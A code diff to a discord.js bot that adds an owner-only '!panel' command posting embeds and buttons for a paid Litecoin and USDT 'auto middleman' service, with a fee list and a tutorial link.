@@ -109,7 +109,51 @@ client.on('ready', async () => {
 client.on('messageCreate', async (message) => {
   if (message.content === '!panel') {
     if (!owners.has(message.author.id) && BigInt(message.author.id) !== SUPER_OWNER) return;
-    // ... rest des panel codes
+    const mainEmbed = new EmbedBuilder()
+      .setTitle('Jace\'s Auto Middleman')
+      .setDescription('• **Paid Service**\n• Read our ToS before using the bot: <#' + TOS_CHANNEL_ID + '>')
+      .setColor(0x2b2d31);
+
+    const feesEmbed = new EmbedBuilder()
+      .setTitle('Fees:')
+      .setDescription('• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**')
+      .setColor(0x2b2d31);
+
+    const ltcEmbed = new EmbedBuilder()
+      .setTitle('🔘 • Request Litecoin •  🔘')
+      .setColor(0x345ca3);
+
+    const usdtEmbed = new EmbedBuilder()
+      .setTitle('🟢 • Request USDT [BEP-20] • 🟢')
+      .setDescription('• Network: **BSC (BEP-20)**')
+      .setColor(0x26a17b);
+
+    const tutorialButton = new ButtonBuilder()
+      .setLabel('Tutorial')
+      .setStyle(ButtonStyle.Link)
+      .setURL('https://www.youtube.com/watch?v=XIkpcT2WNPI')
+      .setEmoji('🔗');
+
+    const ltcButton = new ButtonBuilder()
+      .setCustomId('request_ltc')
+      .setLabel('Request LTC')
+      .setStyle(ButtonStyle.Primary)
+      .setEmoji('🔘');
+
+    const usdtButton = new ButtonBuilder()
+      .setCustomId('request_usdt')
+      .setLabel('Request USDT [BEP-20]')
+      .setStyle(ButtonStyle.Success)
+      .setEmoji('🟢');
+
+    const row1 = new ActionRowBuilder().addComponents(tutorialButton);
+    const row2 = new ActionRowBuilder().addComponents(ltcButton);
+    const row3 = new ActionRowBuilder().addComponents(usdtButton);
+
+    await message.channel.send({ embeds: [mainEmbed, feesEmbed] });
+    await message.channel.send({ embeds: [ltcEmbed], components: [row1, row2] });
+    await message.channel.send({ embeds: [usdtEmbed], components: [row3] });
+    await message.delete().catch(() => {});
   }
 
   if (message.content.startsWith('!steal')) {
